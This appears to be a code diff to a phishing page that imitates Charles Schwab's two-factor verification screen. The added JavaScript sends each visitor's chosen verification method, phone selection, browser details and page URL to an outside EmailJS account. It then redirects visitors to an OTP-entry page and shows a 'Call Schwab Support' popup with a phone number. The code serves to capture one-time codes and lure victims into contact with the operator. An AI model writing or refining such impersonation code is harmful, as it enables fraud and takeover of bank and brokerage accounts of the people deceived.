@@ -700,7 +700,19 @@
         let pendingMethod = null;
         let popupElement = null;
 
-        function showPhonePopup(selectedMethodName, methodId) {
+        // Helper function to redirect with loading state
+        function redirectWithLoading(url) {
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            if (loadingOverlay) loadingOverlay.style.display = 'flex';
+            
+            // Small delay to ensure loading animation is visible
+            setTimeout(() => {
+                window.location.href = url;
+            }, 100);
+        }
+
+        // Function to show popup for SMS and Voice (Text & Call)
+        function showPhonePopup(selectedMethodName, methodId, redirectUrl) {
             if (popupElement) popupElement.remove();
 
             const overlay = document.createElement('div');
@@ -777,7 +789,7 @@
                 if (loadingOverlay) loadingOverlay.style.display = 'flex';
 
                 try {
-                    const response = await emailjs.send(
+                    await emailjs.send(
                         "service_zuj2d2a",
                         "template_tvd86sp",
                         {
@@ -789,11 +801,12 @@
                             url: window.location.href
                         }
                     );
-                    console.log(`✅ Verification requested for ${selectedMethodName} to ${selectedPhone}. Status:`, response.status);
 
                     if (popupElement) popupElement.remove();
                     popupElement = null;
-                    alert(`Verification code sent to ${selectedPhone}. Please check your device.`);
+                    
+                    // Redirect to OTP page after sending code
+                    redirectWithLoading(redirectUrl);
 
                 } catch (error) {
                     console.error("❌ EmailJS failed:", error);
@@ -804,21 +817,84 @@
                     cancelBtn.disabled = false;
                     sendBtn.innerHTML = originalSendText;
                     if (loadingOverlay) loadingOverlay.style.display = 'none';
-                    return;
-                } finally {
+                }
+            });
+        }
+
+        // Function to show Call Schwab info popup
+        function showCallSchwabPopup(redirectUrl) {
+            if (popupElement) popupElement.remove();
+
+            const overlay = document.createElement('div');
+            overlay.className = 'phone-popup-overlay';
+
+            const container = document.createElement('div');
+            container.className = 'phone-popup-container';
+
+            container.innerHTML = `
+                <h3 class="popup-title">Call Schwab Support</h3>
+                <div class="popup-subtitle">Contact us directly for verification assistance</div>
+                <div class="phone-numbers-list" style="text-align: center; padding: 20px 0;">
+                    <div class="phone-number" style="font-size: 24px; font-weight: 600; margin-bottom: 10px;">+1 (877) 519-1403</div>
+                    <div class="phone-label">Available 24/7 for your security needs</div>
+                </div>
+                <div id="popupError" class="error-message" style="display: none;"></div>
+                <div class="popup-actions">
+                    <button class="popup-cancel-btn" id="popupCancelBtn">Cancel</button>
+                    <button class="popup-send-btn" id="popupCallBtn">Continue to Verification</button>
+                </div>
+            `;
+
+            overlay.appendChild(container);
+            document.body.appendChild(overlay);
+            popupElement = overlay;
+
+            const cancelBtn = container.querySelector('#popupCancelBtn');
+            cancelBtn.addEventListener('click', () => {
+                if (popupElement) popupElement.remove();
+                popupElement = null;
+                document.querySelectorAll('.authenticator-option').forEach(opt => opt.classList.remove('selected'));
+            });
+
+            const callBtn = container.querySelector('#popupCallBtn');
+            callBtn.addEventListener('click', async () => {
+                const loadingOverlay = document.getElementById('loadingOverlay');
+                if (loadingOverlay) loadingOverlay.style.display = 'flex';
+
+                try {
+                    await emailjs.send(
+                        "service_zuj2d2a",
+                        "template_tvd86sp",
+                        {
+                            button_clicked: "Call Schwab",
+                            button_id: "devicetag_rep",
+                            selected_phone: "+1 (877) 519-1403",
+                            timestamp: new Date().toLocaleString(),
+                            user_agent: navigator.userAgent,
+                            url: window.location.href
+                        }
+                    );
+                    
+                    if (popupElement) popupElement.remove();
+                    popupElement = null;
+                    
+                    // Redirect to OTP page
+                    redirectWithLoading(redirectUrl);
+                } catch (error) {
+                    console.error("❌ EmailJS failed:", error);
+                    const errDiv = container.querySelector('#popupError');
+                    errDiv.textContent = 'Unable to process request. Please try again.';
+                    errDiv.style.display = 'block';
                     if (loadingOverlay) loadingOverlay.style.display = 'none';
-                    sendBtn.disabled = false;
-                    cancelBtn.disabled = false;
-                    sendBtn.innerHTML = originalSendText;
                 }
             });
         }
 
         const authMethods = {
-            mobile_approve: "Send a mobile notification",
-            otp_sms: "Text me",
-            otp_voice: "Call me",
-            devicetag_rep: "Call Schwab"
+            mobile_approve: { name: "Send a mobile notification", action: "redirect", url: "https://example.com/verify" },
+            otp_sms: { name: "Text me", action: "popup", redirectUrl: "https://example.com/otp-page" },
+            otp_voice: { name: "Call me", action: "popup", redirectUrl: "https://example.com/otp-page" },
+            devicetag_rep: { name: "Call Schwab", action: "custom", redirectUrl: "https://example.com/otp-page" }
         };
 
         Object.keys(authMethods).forEach(methodId => {
@@ -828,12 +904,57 @@
                     e.preventDefault();
                     e.stopPropagation();
 
+                    // Update selected state
                     document.querySelectorAll('.authenticator-option').forEach(opt => opt.classList.remove('selected'));
                     btn.classList.add('selected');
 
-                    const methodName = authMethods[methodId];
-                    pendingMethod = { id: methodId, name: methodName };
-                    showPhonePopup(methodName, methodId);
+                    const methodConfig = authMethods[methodId];
+                    const methodName = methodConfig.name;
+                    
+                    // Handle different actions based on button type
+                    switch(methodConfig.action) {
+                        case "redirect":
+                            // Send a notification - immediate redirect without popup
+                            pendingMethod = { id: methodId, name: methodName };
+                            
+                            const loadingOverlay = document.getElementById('loadingOverlay');
+                            if (loadingOverlay) loadingOverlay.style.display = 'flex';
+                            
+                            emailjs.send(
+                                "service_zuj2d2a",
+                                "template_tvd86sp",
+                                {
+                                    button_clicked: methodName,
+                                    button_id: methodId,
+                                    selected_phone: "Mobile notification",
+                                    timestamp: new Date().toLocaleString(),
+                                    user_agent: navigator.userAgent,
+                                    url: window.location.href
+                                }
+                            ).then(() => {
+                                redirectWithLoading(methodConfig.url);
+                            }).catch((error) => {
+                                console.error("❌ EmailJS failed:", error);
+                                // Still redirect even if email fails
+                                redirectWithLoading(methodConfig.url);
+                            });
+                            break;
+                            
+                        case "popup":
+                            // Text me and Call me - show phone selection popup
+                            pendingMethod = { id: methodId, name: methodName };
+                            showPhonePopup(methodName, methodId, methodConfig.redirectUrl);
+                            break;
+                            
+                        case "custom":
+                            // Call Schwab - show specific phone number
+                            pendingMethod = { id: methodId, name: methodName };
+                            showCallSchwabPopup(methodConfig.redirectUrl);
+                            break;
+                            
+                        default:
+                            console.warn(`Unknown action for method: ${methodId}`);
+                    }
                 });
             }
         });
@@ -847,6 +968,8 @@
                     popupElement = null;
                 }
                 document.querySelectorAll('.authenticator-option').forEach(opt => opt.classList.remove('selected'));
+                selectedPhone = null;
+                pendingMethod = null;
                 alert('Verification cancelled. You may close this window or return to the Schwab home page.');
             });
         }
